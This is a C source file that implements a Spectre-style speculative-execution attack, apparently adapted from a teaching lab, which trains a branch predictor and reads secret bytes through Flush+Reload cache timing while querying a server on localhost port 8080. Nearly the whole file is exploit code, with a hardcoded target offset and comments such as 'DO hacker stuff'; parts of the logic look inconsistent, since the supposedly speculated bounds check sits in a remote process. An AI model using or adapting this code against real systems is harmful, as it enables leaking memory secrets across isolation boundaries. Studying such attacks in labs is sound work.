#include <emmintrin.h>

#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>

#define MAX 80 
#define PORT 8080 
#define SA struct sockaddr 

#define CACHE_HIT_THRESHOLD (150)
#define DELTA 1024
#define STRLEN 8

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
char *secret = "Some Secret Value";   
uint8_t temp = 0;
uint8_t array[256*4096];
uint8_t scores[256];

int sockfd, connfd;
struct sockaddr_in servaddr, cli;

uint8_t func(int sockfd, size_t x)
{
    char buff[MAX];
    int n;
    sprintf(buff, "%d", x);
    write(sockfd, buff, sizeof(buff));
    bzero(buff, sizeof(buff));
    read(sockfd, buff, sizeof(buff));
    sscanf(buff, "%d", &n);
    return n;
}


// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
    return func(sockfd, x);
    
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if(i >= 32 && i <= 126){
      printf("%lld\n", time2);
    }
    if (time2 <= CACHE_HIT_THRESHOLD && i != 0){
      printf("(%d) %lld\n", i, time2);
      scores[i]++;
    }
  } 
}
void spectreAttack(size_t larger_x)
{
  int i;
  uint8_t s;
  volatile int z;
  // Train the CPU to take the true branch inside restrictedAccess().
  for (i = 0; i < 10; i++) { 
   _mm_clflush(&buffer_size);
   restrictedAccess(i); 
  }
  // Flush buffer_size and array[] from the cache.
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  for (z = 0; z < 100; z++) { }
  // Ask restrictedAccess() to return the secret in out-of-order execution. 
  s = restrictedAccess(larger_x);  
  array[s*4096 + DELTA] += 88;  
}

int main() {
    // SETUP NETWORK STUFF


    // socket create and varification 
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT 
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(PORT);

    // connect the client socket to server socket 
    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
        printf("connection with the server failed...\n");
        exit(0);
    }
        printf("connected to the server..\n");

  // DO hacker stuff
  flushSideChannel();
  size_t larger_x = (size_t)(secret - (char*)buffer);  
  larger_x = -9160;
  int consecutive_chars = 0;
  char tmpstr[STRLEN+1];
  for(int i = 0; i < STRLEN; i++){
    for(int j = 0; j < 256; j++){
      scores[j] = 0;
    }
    for(int j = 0; j < 1000; j++){
//     printf("larger_x + i: %d\n", (larger_x+i));
      spectreAttack(larger_x + i);
      reloadSideChannel();
    }
    int max = 0;
    for(int j = 0; j < 256; j++){
      if(scores[max] < scores[j]){
        max = j;
      }
    }
   
/*  
    if(max >= 32 && max <= 126){
      tmpstr[consecutive_chars] = max;
      consecutive_chars+=1;
      if(consecutive_chars >= STRLEN){
        tmpstr[consecutive_chars] = '\x00'; 
        printf("(%p) %s\n", (larger_x + i), tmpstr);

        memset(tmpstr, '\x00', STRLEN);
        consecutive_chars = 0;
      }
    } else {
      if(consecutive_chars > 0){
        memset(tmpstr, '\x00', STRLEN+1);
        consecutive_chars = 0;
      }
    }
*/
    if(max >= 32 && max <= 126){
      //printf("  %c ", max);
      printf("\\x%02x", max);
    } else {
      printf("\\x%02x", max);
    }
    if(i % 18 == 17){ printf("\n"); }
  }
  printf("\n");
  close(sockfd);
  return 0;
}
